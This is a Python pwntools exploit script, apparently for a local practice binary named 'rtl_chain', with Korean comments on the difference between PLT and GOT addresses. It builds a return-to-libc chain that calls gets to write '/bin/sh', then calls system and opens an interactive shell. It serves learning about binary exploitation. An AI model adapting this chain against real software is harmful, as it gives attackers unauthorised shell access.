from pwn import *

p = process("./rtl_chain")

gets_plt = 0x0804a010 #got 를 쓰면 안되는 이유 : plt 주소가 가지고 있는건 got의 "명령어" 주소. 
# got가 가지고 있는건 실제 함수의 주소 "값" ret에서 점프해서 가는건 해당 주소 위치의 명령어를 수행하기 위함임. 
#gets_plt = 0x08048330 
popret = 0x804830d
param = 0x0804a024

p.recvuntil(" : ")
addr = int(p.recv(),16)

log.info("system addr : "+hex(addr))

payload = "a"*24
payload += p32(gets_plt)
payload += p32(popret)
payload += p32(param)
payload += p32(addr)
payload += "bbbb"
payload += p32(param)

pause()
p.sendline(payload)
p.sendline("/bin/sh")

p.interactive()

